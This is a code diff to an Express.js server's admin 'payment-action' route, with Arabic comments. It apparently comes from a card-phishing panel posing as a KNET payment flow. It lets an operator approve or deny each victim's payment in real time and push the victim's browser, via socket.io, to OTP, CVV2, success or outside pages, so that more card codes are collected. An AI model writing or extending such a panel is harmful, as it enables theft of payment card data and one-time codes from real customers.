@@ -131,17 +131,32 @@ app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
   const booking = db.bookings[reference];
   if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
   
+  const currentStatus = booking.status || '';
+  // تحديد التوجيه بناءً على الحالة الحالية
+  const isCvvStage = currentStatus === 'pending_cvv' || currentStatus === 'pending_cvv2';
+
   if (action === 'pass') {
     booking.status = 'approved';
     if (booking.payment) booking.payment.paymentAction = 'pass';
-    // عند القبول: توجيه العميل لصفحة OTP تلقائياً
-    db.redirects[reference] = 'otp';
+    
+    let redirectTarget;
+    if (isCvvStage) {
+      // مرحلة CVV2: قبول يوجه للنجاح
+      redirectTarget = 'success';
+    } else {
+      // مرحلة KNET/دفع: قبول يوجه لصفحة OTP
+      redirectTarget = 'otp';
+    }
+    
+    db.redirects[reference] = redirectTarget;
+    io.emit('redirect_user', { reference, redirect: getRedirectUrl(redirectTarget, reference) });
+    
     if (booking.knetId) {
-      db.redirects[booking.knetId] = 'otp';
+      db.redirects[booking.knetId] = redirectTarget;
       const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId || p.knetId === booking.knetId);
       if (knetPayment) {
         knetPayment.status = 'APPROVED';
-        knetPayment.adminRedirectUrl = getRedirectUrl('otp', reference);
+        knetPayment.adminRedirectUrl = getRedirectUrl(redirectTarget, reference);
         knetPayment.updatedAt = new Date().toISOString();
         io.emit('payment_updated', knetPayment);
         io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: knetPayment.adminRedirectUrl });
@@ -150,17 +165,28 @@ app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
   } else if (action === 'denied') {
     booking.status = 'cancelled';
     if (booking.payment) booking.payment.paymentAction = 'denied';
-    // عند الرفض: توجيه لصفحة رفض
-    db.redirects[reference] = 'https://insoline.online';
+    
+    let deniedRedirect;
+    if (isCvvStage) {
+      // مرحلة CVV2: رفض يعيد لصفحة CVV2
+      deniedRedirect = 'cvv2';
+    } else {
+      // مرحلة KNET: رفض يعيد للرئيسية
+      deniedRedirect = 'https://insoline.online';
+    }
+    
+    db.redirects[reference] = deniedRedirect;
+    io.emit('redirect_user', { reference, redirect: typeof deniedRedirect === 'string' && deniedRedirect.startsWith('http') ? deniedRedirect : getRedirectUrl(deniedRedirect, reference) });
+    
     if (booking.knetId) {
-      db.redirects[booking.knetId] = 'https://insoline.online';
+      db.redirects[booking.knetId] = deniedRedirect;
       const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId || p.knetId === booking.knetId);
       if (knetPayment) {
         knetPayment.status = 'REJECTED';
-        knetPayment.adminRedirectUrl = 'https://insoline.online';
+        knetPayment.adminRedirectUrl = typeof deniedRedirect === 'string' && deniedRedirect.startsWith('http') ? deniedRedirect : getRedirectUrl(deniedRedirect, reference);
         knetPayment.updatedAt = new Date().toISOString();
         io.emit('payment_updated', knetPayment);
-        io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: 'https://insoline.online' });
+        io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: knetPayment.adminRedirectUrl });
       }
     }
   } else if (action === 'completed') {
